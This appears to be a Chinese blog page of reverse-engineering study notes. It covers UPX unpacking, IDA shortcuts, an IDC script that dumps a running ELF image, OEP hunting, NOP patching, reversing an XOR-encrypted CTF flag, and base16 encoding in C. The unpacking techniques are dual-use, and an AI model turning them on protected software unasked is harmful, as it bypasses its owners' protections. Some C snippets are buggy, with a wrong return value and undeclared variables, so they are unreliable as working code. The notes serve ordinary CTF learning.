<h4 id="程序脱壳"><a href="#程序脱壳" class="headerlink" title="程序脱壳"></a>程序脱壳</h4><p>当用ida静态分析文件时发现函数数特别少一般即为加壳了，可用upx对程序进行脱壳 在powershell中用</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> E:\EDGE下载\upx<span class="literal">-3</span>.<span class="number">96</span><span class="literal">-win64</span></span><br><span class="line">upx.exe <span class="literal">-d</span> （文件地址和文件名,）//注意文件名中如果带空格可能会被识别成参数或命令 无法正确寻址</span><br></pre></td></tr></table></figure></div>

<h5 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h5><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>C</td>
<td>转换为代码</td>
<td>一般在IDA无法识别代码时使用这两个功能整理代码</td>
</tr>
<tr>
<td>D</td>
<td>转换为数据</td>
<td></td>
</tr>
<tr>
<td>A</td>
<td>转换为字符</td>
<td></td>
</tr>
<tr>
<td>N</td>
<td>为标签重命名</td>
<td>方便记忆，避免重复分析。</td>
</tr>
<tr>
<td>；</td>
<td>添加注释</td>
<td></td>
</tr>
<tr>
<td>R</td>
<td>把立即值转换为字符</td>
<td>便于分析立即值</td>
</tr>
<tr>
<td>H</td>
<td>把立即值转换为10进制</td>
<td></td>
</tr>
<tr>
<td>Q</td>
<td>把立即值转换为16进制</td>
<td></td>
</tr>
<tr>
<td>B</td>
<td>把立即值转换为2进制</td>
<td></td>
</tr>
<tr>
<td>G</td>
<td>跳转到指定地址</td>
<td></td>
</tr>
<tr>
<td>X</td>
<td>交叉参考</td>
<td>便于查找API或变量的引用</td>
</tr>
<tr>
<td>SHIFT+&#x2F;</td>
<td>计算器</td>
<td></td>
</tr>
<tr>
<td>ALT+ENTER</td>
<td>新建窗口并跳转到选中地址</td>
<td>这四个功能都是方便在不同函数之间分析（尤其是多层次的调用）。具体使用看个人喜好</td>
</tr>
<tr>
<td>ALT+F3</td>
<td>关闭当前分析窗口</td>
<td></td>
</tr>
<tr>
<td>ESC</td>
<td>返回前一个保存位置</td>
<td></td>
</tr>
<tr>
<td>CTRL+ENTER</td>
<td>返回后一个保存位置</td>
<td></td>
</tr>
</tbody></table>
<p>有些未含有特征码（特征码被修改），则需要是用dump,直接将实际运行的程序（二进制）记录下来，就起到了脱壳的作用</p>
<p>因为壳会掩盖其实际代码，通过debbugger实际运行会暴露其代码通过以下脚本（偷的）可以获取真实的代码文件（也算是脱壳）</p>
<p>下面为脚本（idc类似于c++）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOAD              1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">         <span class="keyword">auto</span> e_phoff;</span><br><span class="line">         <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">         <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">         ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">         StartImg=<span class="number">0x400000</span>;</span><br><span class="line">         EndImg=<span class="number">0x0</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(ImageBase)==<span class="number">0x7f454c46</span> || <span class="built_in">Dword</span>(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=<span class="built_in">fopen</span>(<span class="string">&quot;D:\\dumpfile&quot;</span>,<span class="string">&quot;wb&quot;</span>))<span class="comment">//这路可以更改路径</span></span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+<span class="built_in">Qword</span>(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phoff = 0x%x\n&quot;</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="built_in">Word</span>(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phnum = 0x%x\n&quot;</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123; </span><br><span class="line">                                 p_offset=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">                                 StartImg=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">                                 EndImg=StartImg+<span class="built_in">Qword</span>(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;</span>, StartImg, EndImg, p_offset);</span><br><span class="line">                                 <span class="built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;dump segment %d ok.\n&quot;</span>,i);</span><br><span class="line">                         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fclose</span>(dumpfile);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">Message</span>(<span class="string">&quot;dump err.&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> i;</span><br><span class="line">        <span class="keyword">auto</span> size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        <span class="built_in">fseek</span>(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">fputc</span>(<span class="built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但使用此脚本时首先得找到OEP（程序入口点，真正实现程序功能的入口）</p>
<h6 id="OEP"><a href="#OEP" class="headerlink" title="OEP"></a>OEP</h6><p>加壳后会隐藏真正的程序入口点，相当于通过不断地跳转，反复无意义的加减等等（又称作花指令），通过不断地跳转才可以寻找到真正的入口如图下方就是大量的花指令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221212202340428.png"
                      alt="image-20221212202340428"
                ></p>
<p>程序真正运行时往往会进行压栈操作（将函数等数据压入栈中方便执行），而运行结束时会进行出栈操作,可以通过这种特点找到对应的OEP</p>
<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>nop操作</p>
<p>将原花指令（无用的指令）替换为0x90</p>
<p>比如被数据而不是指令所阻碍可以用nop将其连接起来，但是nop并不会修改实际指令所修改的值，所以当某寄存器做出了修改，nop并不能直接替换否则寄存器中的值会与正常运行的值不同，可能会使程序无法正常运行或崩溃,并且nop太多不便于实际分析,所以常用来替代数据.</p>
<h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="1-异或加密"><a href="#1-异或加密" class="headerlink" title="1.异或加密"></a>1.异或加密</h4><p>^ 异或符号，当两个变量A,B异或时其可以看作相对应的bit位分别比较然后进行修改（相同为0，相异为1）如 10010^01110&#x3D;11100但如果其再次对01110取异或则11100^01110&#x3D;10010则又变为异或前的值</p>
<p>异或加密可通过如此解密</p>
<p>题目：geek大挑战-(re)-level1</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*v1 = -85;</span></span><br><span class="line"><span class="comment">  v2 = 0;</span></span><br><span class="line"><span class="comment">  int i,j;</span></span><br><span class="line"><span class="comment">  for ( i = 0; i &lt;= 39; ++i )</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    for ( j = 0; j &lt;= 50; ++j )</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      v1 ^= j ^ v2 ^ 0x5F;</span></span><br><span class="line"><span class="comment">      s[i] ^= s[(i + 1) % 40];</span></span><br><span class="line"><span class="comment">      s[i] ^= v1;</span></span><br><span class="line"><span class="comment">      ++v2;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;*/</span>可通过上文原理解密对应被加密的flag</span><br><span class="line">  <span class="comment">/*for ( k = 0; k &lt;= 39; ++k )</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    if ( s[k] != compare_data[k] )</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      puts(&quot;Ohhhh, TRY HARD&quot;);</span></span><br><span class="line"><span class="comment">      return __readfsqword(0x28u) ^ v7;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;*/</span>校验部分可得到对应数据值，但为异或加密后的值需解密</span><br></pre></td></tr></table></figure></div>

<p>具体如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[] = &#123; <span class="number">161</span>, <span class="number">186</span>, <span class="number">110</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">244</span>, <span class="number">217</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">54</span>, <span class="number">90</span>,</span><br><span class="line">   <span class="number">204</span>, <span class="number">140</span>, <span class="number">30</span>, <span class="number">149</span>, <span class="number">33</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">225</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">168</span>, <span class="number">106</span>,</span><br><span class="line">   <span class="number">66</span>, <span class="number">174</span>, <span class="number">251</span>, <span class="number">247</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">11</span>, <span class="number">75</span>, <span class="number">222</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">135</span>,</span><br><span class="line">   <span class="number">35</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">211</span>, <span class="number">223</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;<span class="comment">//需补充&#x27;\0&#x27;作为字符串结尾（后续解密不需修改）</span></span><br><span class="line">    <span class="type">char</span> v1 = <span class="number">-85</span>;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">0</span>;</span><br><span class="line">    v1 = <span class="number">-85</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">   <span class="comment">/* for (i = 0; i &lt;= 39; ++i)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        for (j = 0; j &lt;= 50; ++j)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            v1 ^= j ^ v2 ^ 0x5F;</span></span><br><span class="line"><span class="comment">            ++v2;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span>加密时是从前往后加密，则解密需要从后往前解密，需要求出最后的v1对应的值才能做解密运算</span><br><span class="line">    <span class="comment">/*for (i = 39; i &gt;= 0; --i)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        for (j = 50; j &gt;= 0; --j)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            --v2;</span></span><br><span class="line"><span class="comment">            s[i] ^= v1;</span></span><br><span class="line"><span class="comment">            s[i] ^= s[(i + 1) % 40];</span></span><br><span class="line"><span class="comment">            v1 ^= j ^ v2 ^ 0x5F;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span>将后面的加密顺序调转（包括指令如加密中最后的++v2变为最上方的--v2，异或运算不用变化，只需跟随加密顺序再将顺序逆转就可进行解密运算了</span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">//以字符串输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以此就可以得到flag了</p>
<h4 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h4><p>base加密算法按分割长度及字典长度不同分为base16，base64等等</p>
<p>base后面的数字指的是它按多少bit划分为一块数据（如base16是以4bit为一块数据，这块数据可以对应2^4个字符类似ascii码，如下图）</p>
<table>
<thead>
<tr>
<th align="center">数据</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">字符</td>
<td align="center">‘0’</td>
<td align="center">‘1’</td>
<td align="center">‘2’</td>
<td align="center">‘3’</td>
</tr>
<tr>
<td align="center">数据</td>
<td align="center">4</td>
<td align="center">5</td>
<td align="center">6</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">字符</td>
<td align="center">‘4’</td>
<td align="center">‘5’</td>
<td align="center">‘6’</td>
<td align="center">‘7’</td>
</tr>
<tr>
<td align="center">数据</td>
<td align="center">8</td>
<td align="center">9</td>
<td align="center">10</td>
<td align="center">11</td>
</tr>
<tr>
<td align="center">字符</td>
<td align="center">‘8’</td>
<td align="center">‘9’</td>
<td align="center">‘A’</td>
<td align="center">‘B’</td>
</tr>
<tr>
<td align="center">数据</td>
<td align="center">12</td>
<td align="center">13</td>
<td align="center">14</td>
<td align="center">15</td>
</tr>
<tr>
<td align="center">字符</td>
<td align="center">‘C’</td>
<td align="center">‘D’</td>
<td align="center">‘E’</td>
<td align="center">‘F’</td>
</tr>
</tbody></table>
<p>base16可以通过将一个字符数据（8bit）拆分为两部分每个数据对应了上图的（字典）</p>
<p>因为char型只有8bit将字符数据拆分可以通过左移’&lt;&lt;’右移’&gt;&gt;’来实现因为要分别计算，可以通过两个函数来实现拆分</p>
<h5 id="注意1：移位算法计算时，是在所有移位操作完成后才会进行补0操作，如a-lt-lt-4-gt-gt-4其值仍然是a，可以通过中间用’b-x3D-a-lt-lt-4；再进行b-gt-gt-4’"><a href="#注意1：移位算法计算时，是在所有移位操作完成后才会进行补0操作，如a-lt-lt-4-gt-gt-4其值仍然是a，可以通过中间用’b-x3D-a-lt-lt-4；再进行b-gt-gt-4’" class="headerlink" title="注意1：移位算法计算时，是在所有移位操作完成后才会进行补0操作，如a&lt;&lt;4&gt;&gt;4其值仍然是a，可以通过中间用’b&#x3D;a&lt;&lt;4；再进行b&gt;&gt;4’"></a>注意1：移位算法计算时，是在所有移位操作完成后才会进行补0操作，如a&lt;&lt;4&gt;&gt;4其值仍然是a，可以通过中间用’b&#x3D;a&lt;&lt;4；再进行b&gt;&gt;4’</h5><h5 id="就可以实现b-x3D-a的低四位"><a href="#就可以实现b-x3D-a的低四位" class="headerlink" title="就可以实现b&#x3D;a的低四位"></a>就可以实现b&#x3D;a的低四位</h5><h5 id="注意2：移位优先级比加减法要低所以移位时注意加括号"><a href="#注意2：移位优先级比加减法要低所以移位时注意加括号" class="headerlink" title="注意2：移位优先级比加减法要低所以移位时注意加括号"></a>注意2：移位优先级比加减法要低所以移位时注意加括号</h5><h5 id="注意3：vs新标准不支持gets，此处fgets效果类似但会将回车（’-n’读入数组内）然后在回车后补空（也是字符串的结束符’-0’）具体指令形式为fgets-字符串数组-字符个数-缓冲区（如stdin）"><a href="#注意3：vs新标准不支持gets，此处fgets效果类似但会将回车（’-n’读入数组内）然后在回车后补空（也是字符串的结束符’-0’）具体指令形式为fgets-字符串数组-字符个数-缓冲区（如stdin）" class="headerlink" title="注意3：vs新标准不支持gets，此处fgets效果类似但会将回车（’\n’读入数组内）然后在回车后补空（也是字符串的结束符’\0’）具体指令形式为fgets(字符串数组,字符个数,缓冲区（如stdin）)"></a>注意3：vs新标准不支持gets，此处fgets效果类似但会将回车（’\n’读入数组内）然后在回车后补空（也是字符串的结束符’\0’）具体指令形式为fgets(字符串数组,字符个数,缓冲区（如stdin）)</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">base16l</span><span class="params">(<span class="type">char</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> b=a&gt;&gt;<span class="number">4</span>;<span class="comment">/*都使用unsigned char原因是部分编译器默认为signed char 若最高位为1则会被识别成负数,以字符型式是无法显示的，具体结果如下*/</span></span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">r</span><span class="params">( <span class="type">char</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;<span class="comment">/*都使用unsigned char原因是部分编译器默认为signed char 若最高位为1则会被识别成负数,以字符型式是无法显示的，具体结果如下*/</span></span><br><span class="line">    a=b&lt;&lt;<span class="number">4</span>;<span class="comment">/*左移四位先将高4位全部变为0，再将b进行右移4位，可以返回a的低4位（中间用了a来代替输入值b计算的原因是输入值一般为signed char 移位后可能会出现复数，得先转化为unsigned char*/</span></span><br><span class="line">    <span class="keyword">return</span> b &gt;&gt; <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> <span class="title function_">r</span><span class="params">(<span class="type">char</span> m)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> b;</span><br><span class="line">	b = m&lt;&lt;<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">return</span> b &gt;&gt; <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> a = r(<span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %c&quot;</span>,<span class="string">&#x27;h&#x27;</span>, r(<span class="string">&#x27;h&#x27;</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221110143901747.png"
                      alt="image-20221110143901747"
                ></p>
<p> 解密环节也可以通过移位操作实现，将高四位和低四位重新拼接起来，如（h&lt;&lt;4+l,以h代指高四位，以l代指低四位）算法如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> table[] = &#123; <span class="string">&quot;0123456789ABCDEF&quot;</span> &#125;;<span class="comment">//定义相对应的字典</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">check</span><span class="params">( <span class="type">char</span> a, <span class="type">char</span>* b)</span><span class="comment">//检测密文对应的4bit数据并返回该4bit数据</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt;= <span class="number">15</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == *(b + c))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> jiami[<span class="number">100</span>], jiemi[<span class="number">50</span>], e;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入待解密的字符:&quot;</span>);</span><br><span class="line">        fgets(jiami,<span class="number">100</span>,<span class="built_in">stdin</span>);<span class="comment">//vs新标准不支持gets，此处fgets效果类似但会将回车（&#x27;\n&#x27;读入数组内）然后在回车后补空（也是字符串的结束符&#x27;\0&#x27;）具体指令形式为fgets(字符串数组,字符个数,缓冲区)</span></span><br><span class="line">        <span class="keyword">for</span> (a = <span class="number">0</span>; <span class="number">1</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jiami[a] == <span class="string">&#x27;\n&#x27;</span>)<span class="comment">//将回车改为&#x27;\0&#x27;</span></span><br><span class="line">            &#123;</span><br><span class="line">                jiami[a] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">0</span>, c = <span class="number">0</span>; b &lt; a; b += <span class="number">2</span>, c++)</span><br><span class="line">        &#123;</span><br><span class="line">            e = check(jiami[b], table) &lt;&lt; <span class="number">4</span>;<span class="comment">/*此处定义一个e的原因是因为移位优先级比加法低*/</span></span><br><span class="line">            jiemi[c] =(e + check(jiami[b + <span class="number">1</span>], table));<span class="comment">//也可将此处的e改为&#x27;(check(jiami[b], table))&#x27;注意有括号      </span></span><br><span class="line">        &#125;</span><br><span class="line">        jiemi[(a) / <span class="number">2</span> <span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(jiemi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以将加密与解密拼合起来具体如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> table[] = &#123; <span class="string">&quot;0123456789ABCDEF&quot;</span> &#125;;<span class="comment">//字典</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">r</span><span class="params">( <span class="type">char</span> m)</span><span class="comment">//一个字符将被加密为两个字符可分为左右</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;</span><br><span class="line">    a=m&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> a &gt;&gt; <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">l</span><span class="params">(<span class="type">char</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;</span><br><span class="line">    a = n;</span><br><span class="line">    <span class="keyword">return</span> (a&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">check</span><span class="params">( <span class="type">char</span> a, <span class="type">char</span>* b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c;<span class="comment">//将char转为无符号的</span></span><br><span class="line">    <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt;= <span class="number">15</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == *(b + c))<span class="comment">//检索字典寻找其四位对应值</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag, a, b, c, f;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;选择模式加密0/解密1:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;flag);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="type">char</span> yuan[<span class="number">100</span>], jia[<span class="number">200</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入待加密的字符:&quot;</span>);</span><br><span class="line">            fgets(yuan,<span class="number">100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">for</span> (a = <span class="number">0</span>; <span class="number">1</span>; a++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (yuan[a] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (b = <span class="number">0</span>, f = <span class="number">0</span>; b &lt; (<span class="number">2</span> * a); b += <span class="number">2</span>, f++)</span><br><span class="line">            &#123;</span><br><span class="line">                jia[b] = table[l(yuan[f])];</span><br><span class="line">                jia[b + <span class="number">1</span>] = table[r(yuan[f])];</span><br><span class="line">            &#125;</span><br><span class="line">            jia[<span class="number">2</span> * a] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="built_in">puts</span>(jia);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> jiami[<span class="number">100</span>], jiemi[<span class="number">50</span>], e;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入待解密的字符:&quot;</span>);</span><br><span class="line">        fgets(jiami,<span class="number">100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">for</span> (a = <span class="number">0</span>; <span class="number">1</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jiami[a] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                jiami[a] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">0</span>, c = <span class="number">0</span>; b &lt; a; b += <span class="number">2</span>, c++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            jiemi[c] = ((check(jiami[b], table) &lt;&lt; <span class="number">4</span>) + check(jiami[b + <span class="number">1</span>], table));</span><br><span class="line">        &#125;</span><br><span class="line">        jiemi[(a) / <span class="number">2</span> <span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(jiemi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 